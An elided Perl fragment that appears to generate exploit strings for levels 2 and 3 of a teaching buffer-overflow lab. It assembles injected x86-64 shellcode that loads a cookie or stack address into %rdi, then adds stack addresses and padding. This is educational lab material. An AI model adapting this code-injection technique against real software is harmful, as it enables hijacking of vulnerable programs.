...
if ($level == 2) {
	...
	&read_touch("c");
	# Generate shell code
	$shellstring = "popq %rdi; movq \$0x$hcookie,%rdi; ret";
	...
	&print_qword($stack);
	&print_comment("Maintain 16-byte alignment of the stack");
	&repeat_byte(0x0, 8);
...
if ($level == 3) {
	...
	$spos = sprintf("%x", $stack + $offset + 24);
	# Generate shell code
	$shellstring = "popq %rdi; movq \$0x$spos,%rdi; ret";
	@bytes = &shell_code("\t$shellstring");
	&print_comment("Byte code for shell code '$shellstring'");
	&print_bytes(@bytes);
	$padcnt = $offset - scalar(@bytes);
